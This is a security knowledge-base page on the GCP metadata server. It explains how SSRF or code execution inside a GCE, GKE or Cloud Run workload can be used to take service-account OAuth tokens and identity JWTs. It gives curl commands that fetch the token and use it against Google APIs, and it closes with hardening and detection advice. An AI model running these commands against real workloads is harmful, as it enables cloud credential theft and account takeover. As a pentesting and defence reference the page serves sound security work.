---
title: GCP metadata server
slug: gcp-metadata-server
---

> **TL;DR:** `metadata.google.internal` (169.254.169.254) returns OAuth access tokens and signed identity JWTs for the GCE/GKE/Cloud Run service account attached to the workload — any SSRF or code-exec on the box reaches it.

## What it is
Every GCE VM, GKE node, Cloud Run service, Cloud Functions instance, and App Engine app has access to the metadata server at `metadata.google.internal`. It returns the instance's configuration (project ID, zone, attributes) plus two credential primitives: an OAuth2 access token for the attached service account (`/computeMetadata/v1/instance/service-accounts/default/token`) and a signed Google-issued JWT (`/identity?audience=...`) used for OIDC trust to other systems. The endpoint requires the header `Metadata-Flavor: Google`, which is the main "protection" against trivial SSRF, but is set automatically by Google libraries and easily added by any attacker with arbitrary header control.

## Preconditions / where it applies
- Code execution or SSRF (with header control) inside a GCP workload that has a service account attached.
- For GKE: workload identity may rewrite the endpoint — the pod-level token goes through `gke-metadata-server` which restricts based on KSA→GSA binding.
- IPv6/legacy endpoint `169.254.169.254` works; firewall egress rules rarely block link-local.

## Technique
1. Hit `/token` for the default service account.
2. Hit `/identity` with a target `audience` for OIDC federation tokens.
3. Use the access token via `gcloud` or raw API calls.

```bash
# Required header — Google libs add it for you
H='Metadata-Flavor: Google'
BASE=http://metadata.google.internal/computeMetadata/v1

curl -sH "$H" $BASE/instance/service-accounts/default/scopes
curl -sH "$H" $BASE/instance/service-accounts/default/token
curl -sH "$H" "$BASE/instance/service-accounts/default/identity?audience=https://example.com"
curl -sH "$H" $BASE/project/project-id
```

```bash
# Use the access token
TOK=$(curl -sH "$H" $BASE/instance/service-accounts/default/token | jq -r .access_token)
curl -sH "Authorization: Bearer $TOK" \
  https://cloudresourcemanager.googleapis.com/v1/projects
```

```bash
# GKE workload identity path — token is mapped to the bound GSA
curl -sH "$H" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
```

SSRF caveat: until 2020 the metadata server accepted requests without the `Metadata-Flavor` header on the v1beta1 path, which made dumb SSRF lethal. That path is gone; modern SSRF needs header injection (e.g. via CRLF or template engines that let you add headers).

## Detection and defence
- Set `enableMetadataServerHardening` / `--no-scopes` and avoid the default Compute SA on workloads.
- For GKE: enable Workload Identity, set `GKE_METADATA` as the metadata mode so the legacy endpoint is unreachable from pods.
- Cloud Audit Logs: alert on tokens minted via SA short-lived flow + immediate use against high-privilege APIs.
- Related: [[gcp-service-account-enum]], [[aws-instance-metadata]], [[ssrf]].

## References
- [GCP — Storing and retrieving instance metadata](https://cloud.google.com/compute/docs/metadata/overview) — endpoint reference and `Metadata-Flavor` header requirement.
- [HackTricks Cloud — GCP metadata](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-services/gcp-compute/gcp-compute-instance-metadata.html) — SSRF and post-ex notes.
